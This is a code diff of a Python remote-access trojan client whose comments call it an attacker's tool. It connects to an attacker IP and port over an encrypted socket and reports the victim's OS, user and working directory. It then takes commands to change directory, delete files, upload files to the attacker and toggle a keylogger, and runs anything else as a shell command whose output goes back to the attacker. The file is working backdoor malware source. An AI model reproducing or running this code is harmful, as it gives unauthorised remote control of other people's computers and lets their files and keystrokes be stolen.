@@ -18,7 +18,7 @@ class KeyLoggerThread(threading.Thread):
         with Listener(on_press = on_press) as listener:
             listener.join()
 
-HOST = "localhost"  # attacker's IP adress (this is a random one, just to show you)
+HOST = "10.1.21.98"  # attacker's IP adress (this is a random one, just to show you)
 PORT = 6969 # attacker's port on which server is listening
  
 # same syntax here as for the server
@@ -26,14 +26,12 @@ encrypter = encrypted_connection.encrypter(b"d41d8cd98f00b205")
 encrypter.initialize_tcp_connexion_client(HOST,PORT)
 #KeyLoggerThread = KeyLoggerThread()
 #KeyLoggerThread.start()
-encrypter.send_message_client("Nom : "+os.name+"\nSysteme : "+platform.system()+"\nKernel : "+ platform.release() + "\nUser : "+getpass.getuser())
+encrypter.send_message_client("Nom : "+os.name+"\nSysteme : "+platform.system()+"\nKernel : "+ platform.release() + "\nUser : "+getpass.getuser() + "\nDefault path : "+ os.getcwd())
  
 while True:
     command = ""
     command = encrypter.receive_message_client()
-    #split_command = command.split()
     print("Received command : " +command)
-
     if(command.split()[0] == "cd"):
             if len(command.split()) == 1:
                 encrypter.send_message_client((os.getcwd()))
@@ -54,14 +52,12 @@ while True:
             os.remove(fileName)
         except :
             encrypter.send_message_client(("permissionsfailed"))
-    
     elif "dl" in command :
         split_command = command.split()
         try :
             encrypter.UploadFile(split_command[1])
         except:
            encrypter.send_message_client(("permissionsfailed"))
-
     elif command == "keylogger.status" :
         if KeyLoggerThread.isAlive() :
             encrypter.send_message_client(("ACTIVATED"))
@@ -82,15 +78,12 @@ while True:
             encrypter.send_message_client(("ALREADY DEACTIVATED"))
     elif command == "exit" :
         break
- 
     else:
         # do shell command
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         # read output
         stdout_value = proc.stdout.read() + proc.stderr.read()
-#        stdout_value = stdout_value.decode("utf-8")
         # send output to attacker
-        print(stdout_value)
         if(stdout_value != ""):
             encrypter.send_raw_data_client(stdout_value)  # renvoit l'output  à l'attaquant
         else:
